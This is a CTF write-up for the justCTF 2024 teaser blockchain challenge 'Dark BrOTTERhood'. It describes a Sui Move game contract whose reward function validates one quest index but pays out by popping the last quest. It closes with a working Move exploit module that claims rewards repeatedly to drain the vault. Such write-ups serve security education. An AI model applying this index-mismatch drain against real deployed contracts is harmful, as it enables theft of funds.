---
title: "Dark BrOTTERhood - justCTF 2024 teaser"
category: "blockchain"
type: "writeup"
tags: ["blockchain", "dark", "brotterhood", "justctf-2024-teaser", "2024", "ctf-writeup"]
summary: "This challenge was the Medium one of three blockchain challenges at justCTF 2024 teaser."
source:
  name: "CTFtime writeup #39253"
  url: "https://ctftime.org/writeup/39253"
original_source: "https://github.com/n4nika/writeups/blob/main/justCTF2024/dark_brotterhood.md"
ctf:
  name: "justCTF 2024 teaser"
  year: 2024
  challenge: "Dark BrOTTERhood"
---

## Metadata

- **CTF:** justCTF 2024 teaser
- **Task:** Dark BrOTTERhood
- **Author team:** LosFuzzys
- **CTFtime:** <https://ctftime.org/writeup/39253>
- **Original writeup:** <https://github.com/n4nika/writeups/blob/main/justCTF2024/dark_brotterhood.md>

---
# Dark BrOTTERhood

This challenge was the `Medium` one of three blockchain challenges at `justCTF 2024 teaser`. All challenges were related to the `Sui` blockchain with the challenges being written in `Move`.

## Challenge Description  
```  
In the shadowed corners of the Dark Brotterhood's secrets, lies a tavern where valiant Otters barter for swords and shields. Here, amidst whispers of hidden bounties, adventurers find the means to battle fearsome monsters for rich rewards. Join this clandestine fellowship, where the blockchain holds mysteries to uncover. Otters of Valor, your destiny calls; may your path be lined with both honor and gold.

Challenge created by embe221ed & Darkstar49 from OtterSec

nc [db.nc.jctf.pro](http://db.nc.jctf.pro) 31337  
```

We were provided with a download link for a `tar` archive containing the challenge source and a full setup for the server and client.

## Challenge  
The goal in this challenge was to `buy the flag` which costs `1337` but we only have `137`.   
This contract was a little game in which a registered user can do the following:  
* `buy_flag`  
* `buy_sword`  
* `find_a_monster`  
* `fight_monster`  
* `return_home`  
* `get_the_reward`

Additionally there were some functions to later prove ownership of the flag.

The player can find monsters and then fight them. In order to be able to successfully fight a monster, the player's power needs to at least be equal to the monster's:  
```Rust  
public fun find_a_monster(board: &mut QuestBoard, r: &Random, ctx: &mut TxContext) {  
assert!(vector::length(&board.quests) <= QUEST_LIMIT, TOO_MUCH_MONSTERS);

let mut generator = random::new_generator(r, ctx);

let quest = Monster {  
fight_status: NEW,  
reward: random::generate_u8_in_range(&mut generator, 13, 37),  
power: random::generate_u8_in_range(&mut generator, 13, 73)  
};

vector::push_back(&mut board.quests, quest);

}

public fun fight_monster(board: &mut QuestBoard, player: &mut Player, quest_id: u64) {  
let quest = vector::borrow_mut(&mut board.quests, quest_id);  
assert!(quest.fight_status == NEW, WRONG_STATE);  
assert!(player.power > quest.power, BETTER_BRING_A_KNIFE_TO_A_GUNFIGHT);

player.power = 10; // sword breaks after fighting the monster :c

quest.fight_status = WON;  
}  
```

To get more power (the user has 10 in the beginning), the user can `buy_sword` which gives `100` power but costs all `137` coins the user has.  
Since the power gets reset back to 10 every time the player fights a monster and the reward is at max 37 coins, we cannot make a profit from this the intended way.

### First approach  
I first thought that it might be possible to create my own `board` and just plant defeated monsters on that one.  
Unfortunately this was not possible as the user-provided `board` needs to be a `QuestBoard` that was created by the contract itself:  
```Rust  
public struct QuestBoard has key, store {  
id: UID,  
quests: vector<Monster>,  
players: Table<address, bool>  
}  
```

### Working approach  
After looking at the code a little longer, the `get_the_reward` function looked suspicious:  
```Rust  
public fun get_the_reward(  
vault: &mut Vault<OTTER>,  
board: &mut QuestBoard,  
player: &mut Player,  
quest_id: u64,  
ctx: &mut TxContext,  
) {  
let quest_to_claim = vector::borrow_mut(&mut board.quests, quest_id);  
assert!(quest_to_claim.fight_status == FINISHED, WRONG_STATE);

let monster = vector::pop_back(&mut board.quests);

let Monster {  
fight_status: _,  
reward: reward,  
power: _  
} = monster;

let coins = coin::split(&mut vault.cash, (reward as u64), ctx);   
coin::join(&mut player.coins, coins);  
}  
```  
Here the `quest_id` is a user-provided number, indicating which quest we want to claim. It also checks that the quest's status is `FINSIHED` indicating that hte monster was beat and the player returned home. The bug is present in the line afterwards. The monster to get the reward from is not taken based on the `quest_id` but popped back from the board's quests.  
This means that if we provide any index other than the last, the check for the `fight_status` is not done on the quest we are claiming.  
With this discrepancy we can now do the following:  
* buy a sword  
* find multiple monsters (limit is 25)  
* fight the 0th monster  
* return home  
* call `get_the_reward` multiple times always with index 0  
* profit  
  
## Exploit  
```Rust  
module solve::solve {

// [*] Import dependencies  
use challenge::Otter::{Self, OTTER};  
use sui::random::Random;

#[allow(lint(public_random))]  
public fun solve(  
_vault: &mut Otter::Vault<OTTER>,  
_questboard: &mut Otter::QuestBoard,  
_player: &mut Otter::Player,  
_r: &Random,  
_ctx: &mut TxContext,  
) {  
// Your code here ...

Otter::buy_sword(_vault, _player, _ctx);

let mut i = 0;  
let mut j = 0;  
let mut y = 0;  
Otter::find_a_monster(_questboard, _r, _ctx);  
Otter::fight_monster(_questboard, _player, 0);  
Otter::return_home(_questboard, 0);

while (i <= 10) {  
i = i + 1;

while (j < 10) {  
Otter::find_a_monster(_questboard, _r, _ctx);  
j = j + 1;  
};

while (y < 10) {  
Otter::get_the_reward(_vault, _questboard, _player, 0, _ctx);  
y = y + 1;  
};  
y = 0;  
j = 0;  
};

let flag = Otter::buy_flag(_vault, _player, _ctx);  
Otter::prove(_questboard, flag);

return;  
}  
}  
```  
This exploit is not optimal but we played around and got this to work remotely.   
Now compiling and throwing this at the server yields the flag.
